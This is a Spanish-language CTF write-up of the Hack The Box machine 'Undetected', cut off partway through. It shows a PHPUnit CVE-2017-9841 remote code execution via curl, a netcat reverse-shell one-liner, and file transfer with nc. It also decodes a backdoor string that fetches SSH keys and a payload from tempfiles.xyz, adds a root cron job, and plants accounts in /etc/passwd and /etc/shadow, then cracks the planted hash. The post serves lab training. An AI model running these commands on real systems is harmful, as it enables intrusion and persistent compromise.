<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="WriteUp Undetected HTB" /><meta name="author" content="rabb1t" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root" /><meta property="og:description" content="Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root" /><link rel="canonical" href="https://rabb1t-0.github.io/posts/WriteUp-Undetected-HTB/" /><meta property="og:url" content="https://rabb1t-0.github.io/posts/WriteUp-Undetected-HTB/" /><meta property="og:site_name" content="rabb1t" /><meta property="og:image" content="https://www.hackthebox.com/storage/avatars/642db092f1e18466871db9f12933396f.png" /><meta property="og:image:height" content="180" /><meta property="og:image:width" content="180" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-04T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/642db092f1e18466871db9f12933396f.png" /><meta property="twitter:title" content="WriteUp Undetected HTB" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabb1t"},"dateModified":"2024-08-03T17:28:44-05:00","datePublished":"2022-07-04T00:00:00-05:00","description":"Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root","headline":"WriteUp Undetected HTB","image":{"width":180,"height":180,"url":"https://www.hackthebox.com/storage/avatars/642db092f1e18466871db9f12933396f.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rabb1t-0.github.io/posts/WriteUp-Undetected-HTB/"},"url":"https://rabb1t-0.github.io/posts/WriteUp-Undetected-HTB/"}</script><title>WriteUp Undetected HTB | rabb1t</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/rbit.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/favicon/rbit.ico"><meta name="apple-mobile-web-app-title" content="rabb1t"><meta name="application-name" content="rabb1t"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto glitch"><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div></a></div><div class="site-title mt-3"> <a href="/">rabb1t</a></div><div class="site-subtitle font-italic">Blog personal, CTFS, artículos de ciberseguridad y más.</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog" class="nav-link cybr-btn"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> INICIO <span class='cybr-btn__glitch' aria-hidden=''>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> CATEGORÍAS <span aria-hidden class="cybr-btn__glitch">CATEGORÍAS </span> </a><li class="nav-item"> <a href="/tags/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> ETIQUETAS <span aria-hidden class="cybr-btn__glitch">ETIQUETAS </span> </a><li class="nav-item"> <a href="/archives/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> ARCHIVO <span aria-hidden class="cybr-btn__glitch">ARCHIVO </span> </a><li class="nav-item"> <a href="/about/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> ACERCA DE <span aria-hidden class="cybr-btn__glitch">ACERCA DE </span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rabb1t-0 " aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/rabb1t" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog"> Inicio </a> </span> <span>WriteUp Undetected HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3C/svg%3E" data-src="https://www.hackthebox.com/storage/avatars/642db092f1e18466871db9f12933396f.png" class="preview-img bg" alt="Preview Image" width="180" height="180" data-proofer-ignore><h1 data-toc-skip>WriteUp Undetected HTB</h1><div class="post-meta text-muted"><div> Por <em> rabb1t </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1656910800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-04 </em> </span> <span> Actualizado <em class="timeago" data-ts="1722724124" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2078 palabras"> <em>11 min</em> de lectura</span></div></div></div><div class="post-content"><h2 id="índice"><span class="mr-2">Índice</span><a href="#índice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#máquina-undetected">Información básica de la máquina</a><li><a href="#herramientas-y-recursos-empleados">Herramientas-y-recursos-empleados</a><li><a href="#fase-de-enumeración">Fase de enumeración</a><li><a href="#explotando-la-vulnerabilidad-de-php-unit">Explotando fallo de PHP Unit (CVE-2017-9841)</a><li><a href="#escalando-prilivegios-al-usuario-steven">Privesc steven</a><li><a href="#escalando-privilegios-al-usuario-root">Privesc root</a></ul><h2 id="máquina-undetected"><span class="mr-2">Máquina Undetected</span><a href="#máquina-undetected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>IP<th>10.10.11.146<tbody><tr><td>OS<td>Linux<tr><td>Dificultad<td>Media<tr><td>Creador<td>TheCyberGeek</table></div><h2 id="herramientas-y-recursos-empleados"><span class="mr-2">Herramientas y recursos empleados</span><a href="#herramientas-y-recursos-empleados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Herramientas<ul><li>nmap<li>whatweb<li>JohnTheRipper</ul><li>Recursos<ul><li>CyberChef</ul></ul><hr /><h2 id="fase-de-enumeración"><span class="mr-2">Fase de enumeración</span><a href="#fase-de-enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Comenzamos realizando un escaneo con nmap:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># nmap -p- --min-rate --open 5000 -sS -Pn -vvv -n -oG scan1.out 10.10.11.146</span>
<span class="c"># Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)</span>
Host: 10.10.11.146 <span class="o">()</span>	Status: Up
Host: 10.10.11.146 <span class="o">()</span>	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
</pre></table></code></div></div><p>Vamos a realizar el siguiente escaneo con <em>nmap</em> para obtener un poquito más de información relevante sobre los puertos econtrados anteriormente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c"># nmap -p80,22 -sCV -Pn -oN services.out 10.10.11.146</span>
Nmap scan report <span class="k">for </span>10.10.11.146

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Diana<span class="se">\'</span>s Jewelry
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</pre></table></code></div></div><p>Vemos el titulo de la web <em>Diana’s Jewelry</em> y la versión del servidor apache <em>2.4.41</em>, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más; por lo que, procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por <em>ssh</em>. Ejecutamos la herramienta <strong>whatweb</strong> en la terminal:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.146
http://10.10.11.146 <span class="o">[</span>200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana<span class="se">\'</span>s Jewelry]
</pre></table></code></div></div><p>No obtenemos casi nada relevante (se está usando una versión desactualizada de <em>JQuery</em>, podríamos intentar ver si es vulnerable a prototype pollution) de momento sigamos enumerando.</p><p>Vamos a visualizar la web desde el navegador: <img data-src="/assets/favicon/2022-07-04/undetected1.png" alt="undetected1" data-proofer-ignore></p><p>Todos los botones que hay, no nos llevan a ninguna parte interesante a excepción de <em>store</em>, el cual es un subdominio <code class="language-plaintext highlighter-rouge">store.djewelry.htb</code>, agregamos este subdominio a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que al momento de poner el subdominio en la web, el navegador sepa resolver la dirección.</p><p><img data-src="/assets/favicon/2022-07-04/undetected2.png" alt="undetected2" data-proofer-ignore></p><p>Otra vez, ninguno de los botones nos llevan a ningún lado interesante, incluso en un apartado nos dice que la web está inoperativa para hacer pedidos.</p><p>Procedemos a <em>fuzzear</em> directorios lanzando el script <code class="language-plaintext highlighter-rouge">http-enum</code> de <code class="language-plaintext highlighter-rouge">nmap</code> que tiene un diccionario con alrededor de <code class="language-plaintext highlighter-rouge">1000</code> rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es <code class="language-plaintext highlighter-rouge">djewelry.htb</code>). Hacemos lo mismo para la segunda web con el subdomino <code class="language-plaintext highlighter-rouge">store</code> y nos encontramos los siguientes directorios:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>❯ nmap <span class="nt">-p80</span> <span class="nt">--script</span> http-enum store.djewelry.htb
Nmap scan report <span class="k">for </span>store.djewelry.htb <span class="o">(</span>10.10.11.146<span class="o">)</span>
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.41 (ubuntu)'</span>
|   /images/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.41 (ubuntu)'</span>
|   /js/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.41 (ubuntu)'</span>
|_  /vendor/: Potentially interesting directory w/ listing on <span class="s1">'apache/2.4.41 (ubuntu)'</span>
</pre></table></code></div></div><p>Ya hay dos cosas que llaman bastante la atención: de primeras, la web tiene capacidad de <em>directory listing</em> y de segundo tenemos una carpeta llamada <em>vendor</em> donde se encuentran librerias de PHP (según practicas que se usan normalmente en el desarrollo).</p><p>Comprobamos que tenemos <em>directory listing</em> y vemos lo que hay en la carpeta <em>vendor</em>: <img data-src="/assets/favicon/2022-07-04/undetected3.png" alt="undetected3" data-proofer-ignore></p><h2 id="explotando-la-vulnerabilidad-de-php-unit"><span class="mr-2">Explotando la vulnerabilidad de PHP Unit</span><a href="#explotando-la-vulnerabilidad-de-php-unit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Si hacemos un poco de investigación sobre lo que podemos hacer con lo que tenemos, nos encontramos con la vulnerabilidad <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9841">CVE-2017-9841</a>. Comprobamos que la ruta para explotar la vulnerabilidad existe. Y sí, tenemos la ruta. El código PHP se interpreta y no nos muestra nada en la web, esto pinta muy bien para nosotros.</p><p>Por lo que ejecutando lo siguiente en la terminal:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-sX</span> GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <span class="nt">-d</span> <span class="s2">"&lt;?php system('ifconfig')?&gt;"</span>
</pre></table></code></div></div><p>Nos damos cuenta de que tenemos RCE (ejecución remota de comados en la máquina victima). Vamos a entablarnos una revershell a nuestra interfaz <code class="language-plaintext highlighter-rouge">tun0</code> por el puerto <code class="language-plaintext highlighter-rouge">443</code> con <code class="language-plaintext highlighter-rouge">netcat</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-sX</span> GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <span class="nt">-d</span> <span class="s2">"&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 10.10.16.2 443 &gt;/tmp/f')?&gt;"</span>
</pre></table></code></div></div><p>…y poniéndonos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> en otra ventana:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ nc <span class="nt">-nvlp</span> 443
</pre></table></code></div></div><p>Ganamos acceso como el usuario <code class="language-plaintext highlighter-rouge">www-data</code> Ahora procedemos a hacer el <a href="https://github.com/barricadadigital/Pentesting/blob/master/pentesting/reverse-shell/tratamiento-de-la-tty.md">tratamiento de la tty</a> para tener una shell interactiva.</p><h2 id="escalando-prilivegios-al-usuario-steven"><span class="mr-2">Escalando prilivegios al usuario steven</span><a href="#escalando-prilivegios-al-usuario-steven" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Haciendo reconocimiento básico sobre el sistema con este usuario, no encontramos nada de lo que nos podamos aprovechar; sin embargo, hay un archivo que llama bastante la atención en la ruta <code class="language-plaintext highlighter-rouge">/var/backups/info</code> (es un binario).</p><p>Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, escribimos lo siguiente en la máquina victima:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ nc <span class="nt">-Nv</span> 10.10.16.9 4343 &lt; info
</pre></table></code></div></div><p>…y en nuestra máquina escribimos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ nc <span class="nt">-nvlp</span> 4343 <span class="o">&gt;</span> info
</pre></table></code></div></div><p>Ejecutamos el comando <code class="language-plaintext highlighter-rouge">strings</code> sobre el binario:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ strings info
</pre></table></code></div></div><p>…encontramos el siguiente texto dentro de todas las cadenas imprimibles:</p><blockquote><p>776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b</p></blockquote><p>Parece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia. Ahora podemos tratarlo con el siguiente comando:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ <span class="nb">cat </span>info_hex | xxd <span class="nt">-p</span> <span class="nt">-r</span>
</pre></table></code></div></div><p>Lo que nos muestra lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget tempfiles.xyz/authorized_keys <span class="nt">-O</span> /root/.ssh/authorized_keys<span class="p">;</span> wget tempfiles.xyz/.main <span class="nt">-O</span> /var/lib/.main<span class="p">;</span> <span class="nb">chmod </span>755 /var/lib/.main<span class="p">;</span> <span class="nb">echo</span> <span class="s2">"* 3 * * * root /var/lib/.main"</span> <span class="o">&gt;&gt;</span> /etc/crontab<span class="p">;</span> <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")}'</span> /etc/passwd<span class="p">;</span> <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1" "$3" "$6" "$7" &gt; users.txt")}'</span> /etc/passwd<span class="p">;</span> <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> user group home shell _<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user</span><span class="s2">"</span>1<span class="s2">":x:</span><span class="nv">$group</span><span class="s2">:</span><span class="nv">$group</span><span class="s2">:,,,:</span><span class="nv">$home</span><span class="s2">:</span><span class="nv">$shell</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /etc/passwd<span class="p">;</span> <span class="k">done</span> &lt; users.txt<span class="p">;</span> <span class="nb">rm </span>users.txt<span class="p">;</span>
</pre></table></code></div></div><p>Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo. Yo le pondré <code class="language-plaintext highlighter-rouge">hash</code>. Ahora podemos crackearlo con <a href="https://www.openwall.com/john/">John the Ripper</a>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>❯ john <span class="nt">-w</span> /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 128/128 SSE2 2x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
ihatehackers     <span class="o">(</span>?<span class="o">)</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>Obtenemos en texto claro su equivalencia (linea 7: <code class="language-plaintext highlighter-rouge">ìhatehackers</code>) ¿De qué usuario? En el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podimos ver que hay dos usuarios con una shell, los cuales son “steven y steven1” (además de “root” y “www-data”). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario <code class="language-plaintext highlighter-rouge">steven1</code>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ su steven1
Password: ihatehackers
</pre></table></code></div></div><p>Incluso si probamos la conexión por ssh, podemos acceder a ese usuario.</p><h2 id="escalando-privilegios-al-usuario-root"><span class="mr-2">Escalando privilegios al usuario root</span><a href="#escalando-privilegios-al-usuario-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Procedemos a realizar enumeración con este usuario. Revisando algunos archivos nos encontramos con un email en la siguiente ruta <code class="language-plaintext highlighter-rouge">/var/mail/steven</code>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>steven@production:/var/mail<span class="nv">$ </span><span class="nb">cat </span>steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: &lt;root@production&gt;
Received: from production <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1]<span class="o">)</span>
	by production <span class="o">(</span>8.15.2/8.15.2/Debian-18<span class="o">)</span> with ESMTP <span class="nb">id </span>80FAcdZ171847
